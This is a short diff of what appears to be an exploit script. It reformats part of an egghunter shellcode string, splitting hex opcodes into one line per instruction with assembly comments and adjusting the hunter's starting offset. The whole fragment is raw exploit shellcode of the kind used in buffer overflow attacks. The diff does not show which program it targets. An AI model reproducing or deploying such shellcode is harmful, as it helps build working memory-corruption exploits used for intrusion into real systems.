@@ -19,18 +19,20 @@ eggh = (
 "\x66\x81\xCA\xFF\x0F"                # OR DX,0FFF
 
 # Edit - Moving Egghunter close to start of tag
-# mov eax, esp
-# pop edx
-# pop edx
-# pop edx
-# pop edx
-# pop edx
-# pop edx
-# pop edx
-# pop edx
-# mov esp, eax
-# sub edx, 0x1119
-"\x89\xE0\x5A\x5A\x5A\x5A\x5A\x5A\x5A\x5A\x89\xC4\x81\xEA\x19\x11\x00\x00"
+
+"\x89\xE0" # mov eax, esp
+"\x5A" # pop edx
+"\x5A" # pop edx
+"\x5A" # pop edx
+"\x5A" # pop edx
+"\x5A" # pop edx
+"\x5A" # pop edx
+"\x5A" # pop edx
+"\x5A" # pop edx
+"\x89\xC4" # mov esp, eax
+"\x81\xEA\x19\x11\x00\x00" # sub edx, 0x1119
+
+# End Edit
 
 "\x42"                                # INC EDX
 "\x52"                                # PUSH EDX
